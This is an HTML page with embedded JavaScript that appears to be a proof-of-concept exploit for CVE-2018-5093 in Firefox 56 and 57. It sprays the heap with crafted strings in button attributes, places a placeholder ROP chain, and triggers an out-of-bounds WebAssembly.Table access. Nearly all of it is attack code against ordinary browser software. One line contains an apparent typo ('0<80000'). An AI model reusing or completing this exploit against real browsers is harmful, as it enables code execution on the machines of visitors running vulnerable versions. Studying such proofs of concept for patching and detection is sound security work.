<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8"/>
	<title>Firefox 56 & 57</title>
</head>
<body>

	<div id="lolid"></div>

	<script>
	
		/*
			CVE 2018 5093 on Firefox 56 and 57
		*/
	
		var div_container = document.getElementById("lolid");
		div_container.style.cssText = "display:none";
		var data;
		var junk2 = unescape("%u1010");
		offset = 0x104;
		
		
		junk = unescape("%u0000%u0000%u1010%u1010"); // 10101008
		junk += unescape("%u0000%u0000%u106c%u1010%u1040%u1010%u0000%u0000"); // 10101010
		junk += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000"); // 10101020
		junk += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000"); // 10101030
		junk += unescape("%u0000%u0000%u1010%u1010%u1008%u1010%u0000%u0000"); // 10101040
		junk += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000"); // 10101050
		junk += unescape("%u0000%u0000%u0000%u0000%u1080%u1010%u0000%u0000"); // 10101060
		junk += unescape("%u0000%u0000%u1020%u1010%u0000%u0000%u0000%u0000"); // 10101070
		junk += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000"); // 10101080
		junk += unescape("%u4141%u4141%u1010%u1010%u0000%u0000%u0000%u0000"); // 10101090
		
		
		while(junk.length < 0x1000) junk += unescape("%u1010");
		rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747");
		
		data = junk.substring(0,offset) + rop;
		data += junk.substring(0,0x800 - offset - rop.length);
		
		while(data.length < 0x80000) data += data;
		
		while(junk2.length < 0x50) junk2 += unescape("%u1010");
		
		for(var i=0; i<0x500; i++) {
			var obj = document.createElement("button");
			obj.title = data.substring(0,0x80000 - 0x58) + junk2.substring(0,76) + unescape("%u1010%u1010%u1111%u1111") ;
			obj.style.fontFamily = data.substring(0,0<80000 - 0x58);
			div_container.appendChild(obj);
		}
	
		
		/*
			VULNERABILITY
		*/
		
		setTimeout(function() {
			var table = new WebAssembly.Table({
				element: 'anyfunc',
				initial: 0
			});
			table.get(0x02000000);
		},100);
	
	</script>

</body>

</html>